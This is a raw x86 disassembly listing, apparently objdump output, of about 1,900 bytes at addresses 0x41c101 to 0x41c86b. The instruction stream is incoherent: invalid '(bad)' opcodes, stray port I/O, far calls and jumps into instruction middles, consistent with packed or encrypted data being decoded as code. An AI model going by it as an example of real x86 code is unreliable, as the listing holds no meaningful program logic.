  41c101:	lahf   
  41c102:	fwait
  41c103:	inc    eax
  41c104:	out    dx,eax
  41c105:	xchg   edx,eax
  41c106:	push   edi
  41c107:	dec    ebp
  41c108:	adc    al,0x3c
  41c10a:	inc    ebx
  41c10b:	push   ebx
  41c10c:	xchg   DWORD PTR [esi+0x55a733c6],ebp
  41c112:	shl    BYTE PTR [esi-0x3010c1d9],cl
  41c118:	inc    edi
  41c119:	adc    DWORD PTR [edi],edi
  41c11b:	mov    eax,ds:0xb11b1ad8
  41c120:	pop    esi
  41c121:	pop    ss
  41c122:	cmp    al,0x75
  41c124:	push   ebp
  41c125:	adc    al,BYTE PTR [ebp-0x1b]
  41c128:	mov    esp,0xc1304fae
  41c12d:	mov    WORD PTR [edx],?
  41c12f:	inc    edx
  41c130:	add    BYTE PTR [ebp+0x690bd523],bl
  41c136:	jge    0x41c119
  41c138:	jno    0x41c0d1
  41c13a:	dec    esp
  41c13b:	lea    ecx,[eax+ebp*2-0x1e]
  41c13f:	push   edx
  41c140:	mov    esi,0x2a7ac982
  41c145:	cs xchg edx,eax
  41c147:	xchg   ebp,eax
  41c148:	dec    ebx
  41c149:	rcl    BYTE PTR [eax+0x3cb9c9a5],1
  41c14f:	xor    DWORD PTR [ebx+0x29],ebp
  41c152:	fscale 
  41c154:	(bad)  
  41c155:	cmp    DWORD PTR [ecx],ebp
  41c157:	test   esp,ebp
  41c159:	fwait
  41c15a:	push   ds
  41c15b:	push   edx
  41c15c:	nop
  41c15d:	(bad)  
  41c15f:	scas   al,BYTE PTR es:[edi]
  41c160:	in     al,dx
  41c161:	ins    BYTE PTR es:[edi],dx
  41c162:	into   
  41c163:	rcl    DWORD PTR [edi-0x1a0d24b2],1
  41c169:	cmp    dh,BYTE PTR [ecx-0xe207be0]
  41c16f:	dec    edi
  41c170:	cwde   
  41c171:	mov    bh,0x30
  41c173:	lock es icebp 
  41c176:	iret   
  41c177:	pop    edx
  41c178:	retf   
  41c179:	push   esp
  41c17a:	inc    ecx
  41c17b:	push   esi
  41c17c:	shl    bl,0xfc
  41c17f:	push   ebp
  41c180:	mov    WORD PTR [esi+0x6f],?
  41c183:	cld    
  41c184:	bound  edx,QWORD PTR [esi]
  41c186:	lods   al,BYTE PTR ds:[esi]
  41c187:	fmul   DWORD PTR [ebp+edi*8-0x13]
  41c18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c18c:	in     eax,0xc1
  41c18e:	push   ds
  41c18f:	mov    eax,0x7e6bc3c1
  41c194:	in     al,dx
  41c195:	hlt    
  41c196:	or     dh,BYTE PTR ds:0x97d130d3
  41c19c:	jae    0x41c191
  41c19e:	or     DWORD PTR [edx+edx*1+0x627a8348],eax
  41c1a5:	and    DWORD PTR [ebp+ebp*1+0x5692e378],ecx
  41c1ac:	mov    bl,0xe0
  41c1ae:	scas   al,BYTE PTR es:[edi]
  41c1af:	rcr    DWORD PTR [ebp-0x2b],cl
  41c1b2:	fldenv [eax-0x385509fb]
  41c1b8:	pop    edi
  41c1b9:	sbb    DWORD PTR [ecx+ecx*2-0xee9b43e],ebx
  41c1c0:	or     bl,BYTE PTR [ebx+0xc]
  41c1c3:	jecxz  0x41c17c
  41c1c5:	xlat   BYTE PTR ds:[ebx]
  41c1c6:	ret    
  41c1c7:	(bad)  
  41c1c8:	rcl    DWORD PTR [eax+eiz*4+0x30],cl
  41c1cc:	or     BYTE PTR [di],ch
  41c1cf:	jecxz  0x41c17e
  41c1d1:	jno    0x41c188
  41c1d3:	push   ss
  41c1d4:	repnz mov gs,WORD PTR [edi]
  41c1d7:	cmp    DWORD PTR [ebx-0x56942917],0x3588edc
  41c1e1:	ds ja  0x41c226
  41c1e4:	sbb    esi,DWORD PTR [edx+0x736323f9]
  41c1ea:	daa    
  41c1eb:	loopne 0x41c20b
  41c1ed:	xor    edi,edi
  41c1ef:	sub    bl,BYTE PTR [ecx+0x48310e3a]
  41c1f5:	stc    
  41c1f6:	push   cs
  41c1f7:	fs push edx
  41c1f9:	xlat   BYTE PTR ds:[ebx]
  41c1fa:	(bad)  
  41c1fc:	pop    edx
  41c1fd:	push   eax
  41c1fe:	(bad)  
  41c1ff:	push   ss
  41c200:	or     eax,0xf506ae64
  41c205:	in     al,dx
  41c206:	addr16 in al,0xb
  41c209:	addr16 push ebx
  41c20b:	in     al,dx
  41c20c:	outs   dx,DWORD PTR ds:[esi]
  41c20d:	push   ss
  41c20e:	jnp    0x41c1f5
  41c210:	arpl   WORD PTR [edx],cx
  41c212:	gs pop ebp
  41c214:	cmp    bl,BYTE PTR [esi-0x51]
  41c217:	adc    al,0x4a
  41c219:	jp     0x41c22f
  41c21b:	stc    
  41c21c:	xor    ecx,DWORD PTR [edx]
  41c21e:	dec    ebx
  41c21f:	(bad)  
  41c221:	hlt    
  41c222:	sbb    al,0xb7
  41c224:	enter  0xc797,0x7
  41c228:	call   0x98be0fc
  41c22d:	stc    
  41c22e:	iret   
  41c22f:	pop    ebp
  41c230:	xchg   ebp,eax
  41c231:	(bad)  
  41c232:	call   FWORD PTR [esi+0x68]
  41c235:	loop   0x41c1cb
  41c237:	mov    esi,0x664e0b28
  41c23c:	shl    BYTE PTR [esi*8-0x448b77eb],1
  41c243:	adc    BYTE PTR [esi-0x222c0cf9],bh
  41c249:	xor    eax,0xa821c424
  41c24e:	mov    eax,0xa6e7a315
  41c253:	cmp    DWORD PTR [ebx+0x30],esp
  41c256:	int    0xef
  41c258:	inc    ebx
  41c259:	in     eax,dx
  41c25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c25b:	jg     0x41c254
  41c25d:	and    dl,BYTE PTR [bx-0x3]
  41c261:	pop    eax
  41c262:	and    edx,DWORD PTR [ebp+ebx*2+0x26]
  41c266:	pop    ebx
  41c267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c268:	sti    
  41c269:	dec    edi
  41c26a:	cwde   
  41c26b:	or     ebp,ebp
  41c26d:	cdq    
  41c26e:	push   es
  41c26f:	pop    ecx
  41c270:	stos   DWORD PTR es:[edi],eax
  41c271:	add    esi,ebx
  41c273:	cwde   
  41c274:	sub    al,0xf
  41c276:	cmp    eax,0x6e17eac0
  41c27b:	sbb    DWORD PTR [edi+0x1b15a22f],eax
  41c281:	test   al,0x1
  41c283:	sbb    edx,DWORD PTR [edx+ecx*8+0x76]
  41c287:	cld    
  41c288:	mov    ds:0x90350898,eax
  41c28d:	(bad)  [edx-0x7f4388a1]
  41c293:	push   eax
  41c294:	mov    ds:0x14e7572b,al
  41c299:	cmp    al,0x88
  41c29b:	ss jecxz 0x41c26e
  41c29e:	fwait
  41c29f:	sub    eax,0x4aa58633
  41c2a4:	or     al,0x9
  41c2a6:	pop    edi
  41c2a7:	sub    BYTE PTR [esi*2+0x5b51a15c],dl
  41c2ae:	or     ecx,DWORD PTR [eax-0x79]
  41c2b1:	or     bh,BYTE PTR [edx]
  41c2b3:	or     al,0x7c
  41c2b5:	mov    esp,DWORD PTR [edx]
  41c2b7:	and    cl,al
  41c2b9:	push   eax
  41c2ba:	iret   
  41c2bb:	dec    esi
  41c2bc:	xchg   esi,eax
  41c2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2be:	(bad)  
  41c2bf:	pop    edx
  41c2c1:	push   edi
  41c2c2:	push   es
  41c2c3:	dec    edx
  41c2c4:	aaa    
  41c2c5:	in     al,dx
  41c2c6:	pop    edi
  41c2c7:	mov    ecx,0x8215dfee
  41c2cc:	addr16 pop ecx
  41c2ce:	adc    esi,0x2a
  41c2d1:	adc    DWORD PTR [ebp+0x4c8097bd],ebx
  41c2d7:	pop    edi
  41c2d8:	(bad)  
  41c2d9:	call   0xd369:0xfbfa4756
  41c2e0:	imul   edi,DWORD PTR [ecx+ebx*4-0x500ab8cd],0x34
  41c2e8:	test   al,0x15
  41c2ea:	sub    DWORD PTR [edi-0x3e389824],edx
  41c2f0:	dec    edi
  41c2f1:	adc    DWORD PTR [eax+0x6e],ebp
  41c2f4:	lods   eax,DWORD PTR ds:[esi]
  41c2f5:	cmc    
  41c2f6:	inc    ecx
  41c2f7:	dec    eax
  41c2f8:	and    edx,edi
  41c2fa:	sbb    ebp,DWORD PTR [eax+0x48c4e50a]
  41c300:	dec    edx
  41c301:	cmp    DWORD PTR [edx-0x2b77a1c6],0x2c
  41c308:	push   0x50
  41c30a:	inc    esi
  41c30b:	es aam 0x2
  41c30e:	jmp    0x41c2a0
  41c310:	fnsave [edx]
  41c312:	pop    es
  41c313:	xor    al,0xbd
  41c315:	fstp   TBYTE PTR [edx]
  41c317:	lds    eax,FWORD PTR [edi-0x2b]
  41c31a:	imul   BYTE PTR [ecx]
  41c31c:	push   edi
  41c31d:	adc    BYTE PTR [esi+0x6a],bh
  41c320:	js     0x41c31f
  41c322:	mov    esi,0x90342eea
  41c327:	ins    DWORD PTR es:[edi],dx
  41c328:	cmp    ebx,DWORD PTR [ebx-0x766b3289]
  41c32e:	jle    0x41c31c
  41c330:	and    ah,BYTE PTR [edi]
  41c332:	pushf  
  41c333:	mov    dl,0xac
  41c335:	fwait
  41c336:	(bad)  
  41c337:	scas   al,BYTE PTR es:[edi]
  41c338:	sub    DWORD PTR [ecx-0x29e51268],edi
  41c33e:	mov    edi,0xd986fae7
  41c343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c344:	frstor [edi-0x2e144589]
  41c34a:	jno    0x41c3be
  41c34c:	ins    BYTE PTR es:[edi],dx
  41c34d:	jge    0x41c388
  41c34f:	and    BYTE PTR [esi*1-0x53eb6d3e],ah
  41c356:	or     al,0xb3
  41c358:	pop    eax
  41c359:	das    
  41c35a:	adc    esp,eax
  41c35c:	aaa    
  41c35d:	mov    ah,0xde
  41c35f:	rcl    DWORD PTR [esi],0xdf
  41c362:	adc    ah,al
  41c364:	jae    0x41c2f7
  41c366:	push   ss
  41c367:	mov    esi,0xab00660c
  41c36c:	shl    DWORD PTR [ebp+0x4bb7023c],cl
  41c372:	mov    al,0xd4
  41c374:	imul   esi,DWORD PTR [edx-0xc891a5b],0x6d055969
  41c37e:	test   ch,bh
  41c380:	inc    esp
  41c381:	xchg   ch,ah
  41c383:	daa    
  41c384:	not    DWORD PTR [eax]
  41c386:	jle    0x41c30a
  41c388:	call   0x48a4:0xb447bd4f
  41c38f:	adc    edi,edx
  41c391:	mov    dh,al
  41c393:	push   ebx
  41c394:	aaa    
  41c395:	mov    cl,0x2f
  41c397:	ja     0x41c395
  41c399:	xchg   edi,eax
  41c39a:	lea    esi,[edx+0x61f22e2e]
  41c3a0:	inc    edx
  41c3a1:	mov    ds:0xade52297,al
  41c3a6:	js     0x41c3c1
  41c3a8:	xchg   ecx,eax
  41c3a9:	test   DWORD PTR [eax+0x7],edx
  41c3ac:	test   BYTE PTR [edx+0x1d654baf],dl
  41c3b2:	lock push eax
  41c3b4:	in     al,dx
  41c3b5:	push   edx
  41c3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3b7:	mov    al,0x39
  41c3b9:	int3   
  41c3ba:	sub    DWORD PTR [ecx],edi
  41c3bc:	xor    ebp,DWORD PTR [ebp-0x5e6d894c]
  41c3c2:	adc    dh,BYTE PTR [ebx+0x63788658]
  41c3c8:	push   edx
  41c3c9:	hlt    
  41c3ca:	mov    WORD PTR [eax-0x5c2a5f0],bp
  41c3d1:	fwait
  41c3d2:	scas   al,BYTE PTR es:[edi]
  41c3d3:	adc    BYTE PTR [ecx],0x9d
  41c3d6:	jg     0x41c427
  41c3d8:	bound  esi,QWORD PTR [edx-0x29a2f4da]
  41c3de:	or     eax,0xc6b1206
  41c3e3:	lea    ecx,[ebx]
  41c3e5:	pop    ecx
  41c3e6:	xor    dl,BYTE PTR [ebp-0x6d]
  41c3e9:	test   al,0xcd
  41c3eb:	push   edi
  41c3ec:	fld    TBYTE PTR [ecx+0x41]
  41c3ef:	xor    BYTE PTR [eax+0x14],bl
  41c3f2:	rcr    ecx,0x6e
  41c3f5:	fsub   DWORD PTR [ecx]
  41c3f7:	cmp    DWORD PTR [edi+0x6a731cd9],0xffd1d455
  41c401:	cs dec edx
  41c403:	inc    edx
  41c404:	mov    ebp,DWORD PTR [edx]
  41c406:	fidivr DWORD PTR [ecx-0x6539e713]
  41c40c:	sahf   
  41c40d:	ret    0x68c1
  41c410:	hlt    
  41c411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c412:	or     ah,BYTE PTR [ebp-0x65]
  41c415:	jb     0x41c476
  41c417:	add    eax,0xeaa042aa
  41c41c:	mov    ds:0xcd99919d,al
  41c421:	push   es
  41c422:	rcl    BYTE PTR [ecx],cl
  41c424:	jmp    0x783b:0x24d6ce48
  41c42b:	adc    dl,dl
  41c42d:	sub    dl,BYTE PTR [eax]
  41c42f:	push   ss
  41c430:	mov    ah,0x68
  41c432:	push   eax
  41c433:	jmp    0x41c3c3
  41c435:	in     al,dx
  41c436:	sbb    DWORD PTR [ecx+0x6e49d958],0x3601c744
  41c440:	pop    ebx
  41c441:	ret    0x167
  41c444:	scas   eax,DWORD PTR es:[edi]
  41c445:	sub    esi,0xe3b71796
  41c44b:	arpl   WORD PTR [ebx+0x2e02536a],sp
  41c451:	js     0x41c48e
  41c453:	push   edi
  41c454:	imul   edx,DWORD PTR [eax],0x12
  41c457:	or     BYTE PTR [ecx+0x3c],dh
  41c45a:	dec    ebx
  41c45b:	mov    ds:0x340f0ad9,al
  41c460:	mov    bl,0xa
  41c462:	aad    0xd3
  41c464:	jecxz  0x41c491
  41c466:	sub    edx,eax
  41c468:	adc    edx,DWORD PTR [edx+0x49]
  41c46b:	jl     0x41c4b2
  41c46d:	jne    0x41c4be
  41c46f:	xor    BYTE PTR [edx],dl
  41c471:	or     BYTE PTR [edx],bl
  41c473:	fwait
  41c474:	or     al,0xef
  41c476:	mov    al,ds:0x8595bbf2
  41c47b:	cld    
  41c47c:	push   edx
  41c47d:	(bad)  
  41c47e:	inc    ebx
  41c47f:	sub    al,0xa0
  41c481:	jg     0x41c4ba
  41c483:	pop    ebp
  41c484:	lods   al,BYTE PTR ds:[si]
  41c486:	adc    DWORD PTR ds:[edi],ecx
  41c489:	loop   0x41c48e
  41c48b:	mov    ebp,0xa7ffa0
  41c490:	es add al,0x23
  41c493:	jmp    0xd2e97f79
  41c498:	xchg   ebx,eax
  41c499:	std    
  41c49a:	or     al,0xb5
  41c49c:	repnz (bad) 
  41c49e:	aam    0xe0
  41c4a0:	leave  
  41c4a1:	and    ebx,ebx
  41c4a3:	cmp    DWORD PTR [ebx],esi
  41c4a5:	and    eax,0x776aa7f0
  41c4aa:	adc    BYTE PTR [ebp+0x5396f97d],0x80
  41c4b1:	mov    ?,WORD PTR [eax+0x39851e0d]
  41c4b7:	mov    ecx,0x6112249c
  41c4bc:	xchg   ebx,eax
  41c4bd:	mov    ah,0xb5
  41c4bf:	pop    ebx
  41c4c0:	rol    DWORD PTR [edx],0xad
  41c4c3:	and    dl,bh
  41c4c5:	enter  0x1638,0x18
  41c4c9:	ror    BYTE PTR [ecx-0x49],1
  41c4cc:	cmp    BYTE PTR [ecx-0x294f41c1],0x8a
  41c4d3:	daa    
  41c4d4:	retf   
  41c4d5:	scas   eax,DWORD PTR es:[edi]
  41c4d6:	lock sbb eax,0x820b8860
  41c4dc:	push   esi
  41c4dd:	(bad)  gs:[ebx+0x54]
  41c4e1:	imul   edx,DWORD PTR [ebp+0x4112ce8e],0x64
  41c4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e9:	int3   
  41c4ea:	ret    0x4ed1
  41c4ed:	(bad)  
  41c4ee:	out    dx,eax
  41c4ef:	push   es
  41c4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f1:	push   ecx
  41c4f2:	(bad)  
  41c4f3:	in     eax,0xe0
  41c4f5:	xor    eax,esi
  41c4f7:	call   0xca2a2708
  41c4fc:	fisttp DWORD PTR [ebp+0xf3bf1ef]
  41c502:	out    dx,al
  41c503:	dec    esi
  41c504:	test   al,0xa0
  41c506:	mov    dl,0x78
  41c508:	mov    dl,0xde
  41c50a:	dec    edx
  41c50b:	push   es
  41c50c:	mov    esi,0x3e715d9a
  41c511:	rol    BYTE PTR [eax],cl
  41c513:	pushf  
  41c514:	jbe    0x41c517
  41c516:	push   0xffffffcf
  41c518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c519:	aam    0x57
  41c51b:	adc    esp,DWORD PTR [ebx]
  41c51d:	gs inc esp
  41c51f:	pop    ss
  41c520:	jae    0x41c4df
  41c522:	test   BYTE PTR [edi+0x24b6ca0],bh
  41c528:	adc    ecx,DWORD PTR [edx-0x3cdac2f8]
  41c52e:	cmp    esp,esp
  41c530:	js     0x41c554
  41c532:	add    DWORD PTR [ecx-0x36],edx
  41c535:	ins    BYTE PTR es:[edi],dx
  41c536:	in     al,dx
  41c537:	into   
  41c538:	fdiv   QWORD PTR [ebp+0x68]
  41c53b:	repnz (bad) [ebx]
  41c53e:	pop    ecx
  41c53f:	push   ebp
  41c540:	lock arpl cx,bp
  41c543:	ds jns 0x41c503
  41c546:	push   ecx
  41c547:	push   ebp
  41c548:	mov    ?,WORD PTR [ecx+0x13018d8e]
  41c54e:	std    
  41c54f:	sbb    al,0xed
  41c551:	or     eax,0xc5dbae4a
  41c556:	sbb    eax,0x1ab168b7
  41c55b:	mov    eax,ds:0xae8569e3
  41c560:	and    al,0x8f
  41c562:	xchg   edx,eax
  41c563:	jge    0x41c53f
  41c565:	lods   eax,DWORD PTR ds:[esi]
  41c566:	push   ebx
  41c567:	sub    BYTE PTR [ebp-0x6f],dl
  41c56a:	push   edx
  41c56b:	in     eax,dx
  41c56c:	mov    cs,WORD PTR [ecx-0x2d]
  41c56f:	mov    ah,0x94
  41c571:	pop    ecx
  41c572:	jge    0x41c5a0
  41c574:	xchg   DWORD PTR [ecx+ecx*2-0x5f1fa85e],ebp
  41c57b:	dec    ebx
  41c57c:	scas   eax,DWORD PTR es:[edi]
  41c57d:	test   BYTE PTR [edx+0x540e3d2e],bh
  41c583:	je     0x41c5be
  41c585:	cwde   
  41c586:	into   
  41c587:	sbb    DWORD PTR [ebx],esp
  41c589:	xor    ecx,esp
  41c58b:	mov    al,ah
  41c58d:	sbb    al,0xa3
  41c58f:	inc    ecx
  41c590:	push   esi
  41c591:	fnstsw WORD PTR [eax-0x16]
  41c594:	jmp    0x41c5a8
  41c596:	(bad)  
  41c597:	or     esp,DWORD PTR [edi-0xb]
  41c59a:	iret   
  41c59b:	lods   eax,DWORD PTR ds:[esi]
  41c59c:	xchg   esi,eax
  41c59d:	(bad)  
  41c59e:	jns    0x41c587
  41c5a0:	xor    edx,edx
  41c5a2:	fwait
  41c5a3:	ds push eax
  41c5a5:	sbb    al,bl
  41c5a7:	and    esp,DWORD PTR [eax]
  41c5a9:	and    al,0xf1
  41c5ab:	adc    al,0xf2
  41c5ad:	outs   dx,BYTE PTR ds:[esi]
  41c5ae:	sub    al,0x18
  41c5b0:	stos   DWORD PTR es:[edi],eax
  41c5b1:	xchg   edx,eax
  41c5b2:	ror    ebx,cl
  41c5b4:	in     eax,0x9c
  41c5b6:	outs   dx,DWORD PTR ds:[esi]
  41c5b7:	mov    ah,0xfb
  41c5b9:	jecxz  0x41c5ba
  41c5bb:	int3   
  41c5bc:	les    edi,FWORD PTR [ebp-0x64875544]
  41c5c2:	jecxz  0x41c56e
  41c5c4:	mov    eax,ds:0x8e53f370
  41c5c9:	call   0xcf44:0xbf48916c
  41c5d0:	cli    
  41c5d1:	pop    ds
  41c5d2:	adc    eax,0xe655ffbb
  41c5d7:	into   
  41c5d8:	test   al,0x99
  41c5da:	scas   eax,DWORD PTR es:[edi]
  41c5db:	std    
  41c5dc:	dec    ah
  41c5de:	sahf   
  41c5df:	adc    al,0x93
  41c5e1:	out    0x69,eax
  41c5e3:	shl    DWORD PTR [ecx-0x7779b6a6],cl
  41c5e9:	xchg   esp,eax
  41c5ea:	xor    DWORD PTR [esi],esi
  41c5ec:	pop    ds
  41c5ed:	test   DWORD PTR [ecx+0x4],edx
  41c5f0:	and    eax,0xde57ba19
  41c5f5:	(bad)
  41c5f9:	sub    ah,dh
  41c5fb:	sub    dh,BYTE PTR ds:0x21e98919
  41c601:	and    DWORD PTR [ebx+eiz*1+0x3f],edi
  41c605:	sbb    bl,BYTE PTR ss:[edi-0x25d8795e]
  41c60c:	mov    ss,WORD PTR [eax-0x5d]
  41c60f:	push   es
  41c610:	mov    ah,0xfc
  41c612:	sbb    cl,cl
  41c614:	loopne 0x41c680
  41c616:	imul   BYTE PTR [ebp+ebx*2-0xb81b2b6]
  41c61d:	jg     0x41c603
  41c61f:	mov    al,ds:0xbf06549f
  41c624:	jmp    DWORD PTR [ebx-0x5ab7e7ee]
  41c62a:	stc    
  41c62b:	push   0xeba80bd3
  41c630:	ficom  WORD PTR [ebp+ecx*4+0x7a]
  41c634:	icebp  
  41c635:	cdq    
  41c636:	jne    0x41c62d
  41c638:	into   
  41c639:	test   DWORD PTR [edi-0x4942e9c8],ebx
  41c63f:	test   eax,0xf730fb87
  41c644:	xor    eax,0xbc8768a0
  41c649:	mov    cl,BYTE PTR [ecx+0x2298f939]
  41c64f:	scas   eax,DWORD PTR es:[edi]
  41c650:	cwde   
  41c651:	and    cl,0x79
  41c654:	xchg   DWORD PTR [ecx+edx*1],ebx
  41c657:	pop    edi
  41c658:	jge    0x41c6d1
  41c65a:	push   esi
  41c65b:	xor    al,0xb5
  41c65d:	push   eax
  41c65e:	jbe    0x41c61d
  41c660:	mov    edi,0x754ff180
  41c665:	(bad)  
  41c666:	mov    esp,DWORD PTR [edi+0x4778774a]
  41c66c:	adc    BYTE PTR [edi+edi*1-0x7ef63d8f],0x97
  41c674:	leave  
  41c675:	dec    edi
  41c676:	inc    esp
  41c677:	push   0x37
  41c679:	outs   dx,BYTE PTR ds:[esi]
  41c67a:	call   0x70f0abd2
  41c67f:	cmp    bl,ah
  41c681:	mov    esi,0xbdf1d3b0
  41c686:	jb     0x41c6f3
  41c688:	jge    0x41c695
  41c68a:	sbb    bl,BYTE PTR [eax+0x76]
  41c68d:	pop    es
  41c68e:	bnd jle 0x41c630
  41c691:	and    al,0x5d
  41c693:	jnp    0x41c6c5
  41c695:	fbld   TBYTE PTR ds:0xbac6f27
  41c69b:	xchg   ebp,eax
  41c69c:	cmp    BYTE PTR [esi+0x71],ch
  41c69f:	xchg   esi,eax
  41c6a0:	jns    0x41c630
  41c6a2:	bound  ecx,QWORD PTR [ecx+0x3519c849]
  41c6a8:	lods   eax,DWORD PTR ds:[esi]
  41c6a9:	inc    ebx
  41c6aa:	mov    BYTE PTR [esi-0x414aa2f3],bh
  41c6b0:	fst    DWORD PTR [edx]
  41c6b2:	rol    DWORD PTR [ecx-0x15e1eea7],cl
  41c6b8:	mov    dl,0xef
  41c6ba:	test   BYTE PTR [esi+0x700fb8f5],dh
  41c6c0:	je     0x41c70c
  41c6c2:	sub    al,0x2a
  41c6c4:	inc    eax
  41c6c5:	add    ebx,DWORD PTR [edi+0x27ad3666]
  41c6cb:	push   eax
  41c6cc:	xlat   BYTE PTR ds:[ebx]
  41c6cd:	lods   eax,DWORD PTR ds:[esi]
  41c6ce:	fst    DWORD PTR [ebp+0x484d02f]
  41c6d4:	mov    ds:0x1e86f4ce,al
  41c6d9:	dec    ebx
  41c6da:	cmp    BYTE PTR [ecx-0x24],dh
  41c6dd:	in     al,0x85
  41c6df:	mov    ah,BYTE PTR [edx+0x150283bb]
  41c6e5:	cmc    
  41c6e6:	add    ch,bl
  41c6e8:	push   0xffffffda
  41c6ea:	(bad)  
  41c6eb:	dec    ebx
  41c6ec:	push   cs
  41c6ed:	mov    eax,ds:0x9ac33e8a
  41c6f2:	mov    BYTE PTR [edi-0x443e0907],0xb3
  41c6f9:	push   ebp
  41c6fa:	addr16 enter 0x804e,0x96
  41c6ff:	std    
  41c700:	mov    ebp,0xa74f68d9
  41c705:	cbw    
  41c707:	(bad)  
  41c708:	gs pop ecx
  41c70a:	or     ch,BYTE PTR [edi-0x6b2073d]
  41c710:	retf   0x878c
  41c713:	lahf   
  41c714:	mov    dh,BYTE PTR [edx+0x13]
  41c717:	stc    
  41c718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c719:	sti    
  41c71a:	repz popf 
  41c71c:	xor    DWORD PTR [ecx+0x28],edx
  41c71f:	arpl   WORD PTR [edx-0xb],si
  41c722:	enter  0x99d1,0x40
  41c726:	mov    eax,0x76634742
  41c72b:	call   FWORD PTR [esi+eax*4+0x7c]
  41c72f:	enter  0xbc7d,0xfc
  41c733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c734:	inc    esi
  41c735:	adc    edi,DWORD PTR [ebx]
  41c737:	xor    DWORD PTR [esi],esi
  41c739:	mov    eax,ds:0x4b19ef34
  41c73e:	push   cs
  41c73f:	sub    DWORD PTR [ebp+0x3d],ebp
  41c742:	and    al,0xfc
  41c744:	pop    edx
  41c745:	xchg   ebx,eax
  41c746:	jp     0x41c708
  41c748:	call   0xc9826117
  41c74d:	jg     0x41c713
  41c74f:	mov    dh,0x15
  41c751:	(bad)  [ecx-0x5dca1055]
  41c757:	(bad)  
  41c758:	stos   DWORD PTR es:[edi],eax
  41c759:	xchg   edi,eax
  41c75a:	inc    ebp
  41c75b:	outs   dx,BYTE PTR ds:[esi]
  41c75c:	je     0x41c7b0
  41c75e:	je     0x41c75d
  41c760:	fld    st(3)
  41c762:	fdiv   DWORD PTR [ecx-0x46]
  41c765:	add    DWORD PTR [ecx-0x7a428023],esp
  41c76b:	add    al,0x91
  41c76d:	(bad)  
  41c76e:	out    0xe8,eax
  41c770:	test   DWORD PTR [esi-0x57ada036],0x4974b663
  41c77a:	adc    DWORD PTR ds:0x5062d7b8,ebp
  41c780:	dec    edx
  41c781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c782:	pop    esp
  41c783:	add    BYTE PTR [ebx+0x1b],ah
  41c786:	test   al,0xc4
  41c788:	clc    
  41c789:	in     eax,dx
  41c78a:	jmp    0x41c736
  41c78c:	mov    al,0x9b
  41c78e:	mov    ebp,0x2900468f
  41c793:	icebp  
  41c794:	mov    al,BYTE PTR [edx-0x64dad8a5]
  41c79a:	add    ebp,ecx
  41c79c:	loopne 0x41c7f9
  41c79e:	loop   0x41c80f
  41c7a0:	in     eax,dx
  41c7a1:	sar    BYTE PTR [edi+0x38ce2a5c],cl
  41c7a7:	or     eax,0xd995d667
  41c7ac:	jb     0x41c7d8
  41c7ae:	ds mov ebx,0x45226356
  41c7b4:	out    dx,al
  41c7b5:	adc    eax,0xdb7996cf
  41c7ba:	push   ebx
  41c7bb:	ins    BYTE PTR es:[edi],dx
  41c7bc:	adc    BYTE PTR [edx+edi*1+0x4f],bh
  41c7c0:	cli    
  41c7c1:	daa    
  41c7c2:	mov    edx,DWORD PTR [ecx]
  41c7c4:	push   ebp
  41c7c5:	shl    DWORD PTR [eax-0x127b8d70],cl
  41c7cb:	pop    edx
  41c7cc:	aad    0x53
  41c7ce:	jp     0x41c7a4
  41c7d0:	(bad)  
  41c7d1:	retf   0x2276
  41c7d4:	pop    ss
  41c7d5:	xor    BYTE PTR [edi+0x77],al
  41c7d8:	test   al,0x3f
  41c7da:	daa    
  41c7db:	int3   
  41c7dc:	in     eax,dx
  41c7dd:	ret    0x1067
  41c7e0:	dec    esp
  41c7e1:	xchg   esi,eax
  41c7e2:	adc    bl,BYTE PTR [edi-0x2e]
  41c7e5:	fucomip st,st(7)
  41c7e7:	in     eax,0x11
  41c7e9:	inc    esp
  41c7ea:	test   DWORD PTR [ebp+0x12fdcc27],ebp
  41c7f0:	ja     0x41c7b2
  41c7f2:	xor    BYTE PTR [esi-0x2],dh
  41c7f5:	stc    
  41c7f6:	adc    al,0x1e
  41c7f8:	pop    esi
  41c7f9:	mov    ebx,DWORD PTR [eax-0x5b]
  41c7fc:	pop    edi
  41c7fd:	rcr    BYTE PTR [esi],cl
  41c7ff:	pop    esi
  41c800:	hlt    
  41c801:	test   DWORD PTR [ebp-0x73],edi
  41c804:	test   DWORD PTR [edi],esp
  41c806:	int    0xd3
  41c808:	mov    eax,ds:0x9795bf07
  41c80d:	in     eax,0xbe
  41c80f:	xchg   ebp,eax
  41c810:	int    0x96
  41c812:	lds    ecx,FWORD PTR [ebp-0x2e04239d]
  41c818:	lock fwait
  41c81a:	jecxz  0x41c7d8
  41c81c:	lods   eax,DWORD PTR ds:[esi]
  41c81d:	mov    ebx,0x941812a4
  41c822:	and    eax,0x66eb3979
  41c827:	pop    ebp
  41c828:	les    ebx,FWORD PTR [edi]
  41c82a:	xor    ebx,DWORD PTR [ecx+0x52]
  41c82d:	lods   al,BYTE PTR ds:[esi]
  41c82e:	and    edi,0xffffffa7
  41c831:	push   ebp
  41c832:	xor    DWORD PTR [edx+esi*4+0x49028dfd],ecx
  41c839:	lahf   
  41c83a:	mov    eax,ds:0x6e61b0
  41c83f:	loop   0x41c830
  41c841:	jge    0x41c80a
  41c843:	inc    ebx
  41c844:	mov    ebp,0x72197e71
  41c849:	push   ebp
  41c84a:	jge    0x41c85e
  41c84c:	in     eax,0xc5
  41c84e:	push   edi
  41c84f:	test   eax,0x3c1f421d
  41c854:	jb     0x41c80a
  41c856:	xor    ch,BYTE PTR [eax+0x6944f825]
  41c85c:	inc    edi
  41c85d:	cs or  ch,bl
  41c860:	and    eax,0x387b8b8c
  41c865:	mov    edi,DWORD PTR [edi]
  41c867:	and    DWORD PTR [ecx+0x77],esi
  41c86a:	pop    esi
  41c86b:	mov    dl,0x82
